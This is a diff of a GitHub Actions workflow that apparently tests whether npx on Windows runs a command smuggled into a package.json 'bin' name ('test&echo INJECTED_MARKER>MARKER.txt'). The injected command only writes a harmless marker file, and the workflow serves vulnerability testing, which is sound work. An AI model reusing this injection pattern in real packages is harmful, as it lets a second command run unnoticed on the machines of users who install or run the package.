@@ -8,18 +8,18 @@ jobs:
       - name: Setup Node
         uses: actions/setup-node@v4
         with:
-          node-version: '20'
+          node-version: '20.19.0'
       - name: Create malicious package
         shell: cmd
         run: |
           mkdir pkg
-          echo {"name":"malpkg","version":"1.0.0","bin":{"test^&echo INJECTED_MARKER>MARKER.txt":"./index.js"}} > pkg/package.json
+          echo {"name":"malpkg","version":"1.0.0","bin":{"test&echo INJECTED_MARKER>MARKER.txt":"./index.js"}} > pkg/package.json
           echo console.log("hi") > pkg/index.js
       - name: Run npx
         shell: cmd
         run: |
-          npx .\pkg
+          npx .\pkg 2>&1
           if exist MARKER.txt (echo MARKER_CREATED) else (echo NO_MARKER)
-      - name: Show files
+      - name: List files
         shell: cmd
         run: dir
